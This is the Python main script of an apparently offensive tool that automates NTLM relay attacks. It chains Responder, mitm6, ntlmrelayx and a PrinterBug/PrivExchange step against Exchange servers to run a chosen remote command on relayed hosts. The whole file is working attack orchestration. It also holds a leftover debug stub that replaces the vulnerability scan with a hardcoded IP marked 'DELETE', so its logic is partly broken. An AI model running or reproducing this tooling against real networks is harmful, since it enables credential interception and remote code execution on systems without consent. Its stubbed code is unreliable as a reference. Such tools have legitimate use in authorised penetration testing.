#!/usr/bin/env python3

import asyncio
import argparse
import sys
import signal
from src.utils import *
from src.tools import *
from src.smb import get_unsigned_hosts
from netaddr import IPNetwork, AddrFormatError

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-i", "--interface", help="Interface to use with Responder")
    parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
    parser.add_argument("-6", "--mitm6", action='store_true', help="Run mitm6 in conjunction with the relay attack")
    parser.add_argument("-d", "--domain", help="Domain for mitm6 to attack")
    parser.add_argument("-tf", "--target-file", help="Target file for ntlmrelayx to relay to")
    parser.add_argument("-u", "--user", help="Creds for PrivExchange: DOMAIN/user:password")
    parser.add_argument("-ef", "--exchange-file", help="Exchange server IP addresses file")
    parser.add_argument("-dc", "--domain-controller", help="Domain controller for Drop the Mic attack")
    return parser.parse_args()

def parse_hostlist(hostlist):
    """
    Parse the hostlist argument

    Mandatory arguments:
    - hostlist : file with list of IPs or CIDR notation blocks
    """
    hosts = []
    with open(hostlist, 'r') as f:
        host_lines = f.readlines()
        for line in host_lines:
            line = line.strip()
            try:
                if '/' in line:
                    hosts += [str(ip) for ip in IPNetwork(line)]
                elif '*' in line:
                    print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                else:
                    hosts.append(line)
            except (OSError, AddrFormatError):
                print_bad('Error importing host list file. Are you sure you chose the right file?')

    return hosts

def parse_exchange_scan(proc):
    hosts = []
    for l in proc.stdout:
        if "is VULNERABLE" in l:
            host = l.split()[1]
            hosts.append(host)
    return hosts

def cleanup(responder, mitm6, ntlmrelayx, printerbug):
    """
    Catch CTRL-C and kill procs
    """
    print_info('CTRL-C caught, cleaning up and closing')
     # Kill procs
    if responder:
        print_info('Killing Responder')
        responder.kill()
    if ntlmrelayx:
        print_info('Killing ntlmrelayx')
        ntlmrelayx.kill()
    if printerbug:
        print_info('Killing printerbug')
        printerbug.kill()
    if mitm6:
        print_info('Killing mitm6, may take a minute')
        mitm6.kill()

    time.sleep(3)

    try:
        os.remove(f'{cwd}/arp.cache')
    except FileNotFoundError:
        pass

    print_good('Done')
    sys.exit()

async def main():
    responder = None
    ntlmrelayx = None
    mitm6 = None
    printerbug = None

    iface, local_ip = get_iface_and_ip(args)

    if args.user:
        if "@" not in args.user:
            if not args.exchange_file:
                print_bad("Must specify a list of exchange servers with the -ef argument if using creds without \"@ip.add.re.ss\" to scan for vulnerable exchange servers")
                print_bad("Examples: python autorelayx.py -u LAB/dan:Passw0rd@192.168.0.10  ||  python autorelayx.py -u LAB/dan:Passw0rd -ef exchange_servers.txt")
                sys.exit()

        print_info("Testing Exchange servers for CVE-2019-1040 (PrinterBug)")
        #scan = start_exchange_scan(args)
        #vuln_hosts = parse_exchange_scan(scan)
        ############################
        vuln_hosts = ["3.3.3.3"]##### DELETE
        ############################
        if len(vuln_hosts) == 0:
            print_bad("No Exchange servers found vulnerable to SpoolService bug")
            sys.exit()
        else:
            exchange_server = vuln_hosts[0]

        # Run printerbug
        printerbug = start_printerbug(args.user, exchange_server, local_ip)

        # Run ntlmrelayx
        ntlmrelayx = start_ntlmrelayx(args)

    elif args.hostlist:
        hostlist = args.hostlist
        hosts = parse_hostlist(hostlist)
        print_info("Checking for unsigned SMB hosts")
        unsigned_hosts = await get_unsigned_hosts(loop, hosts)

        if len(unsigned_hosts) == 0:
            print_bad('No hosts with SMB signing disabled found, NTLM relaying will fail')

        if len(unsigned_hosts) > 0:
            print_good('Unsigned SMB hosts:')
            for h in unsigned_hosts:
                print_good('  '+h)

        # Start Responder
        responder = start_responder(iface)

        # Start mitm6
        if args.mitm6:
            mitm6 = start_mitm6(args)
        else:
            mitm6 = None

        # Start ntlmrelayx
        ntlmrelayx = start_ntlmrelayx(args)

    cleanup(responder, mitm6, ntlmrelayx, printerbug)

if __name__ == "__main__":

    if os.geteuid():
        print_bad('Run as root')
        sys.exit()

    args = parse_args()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()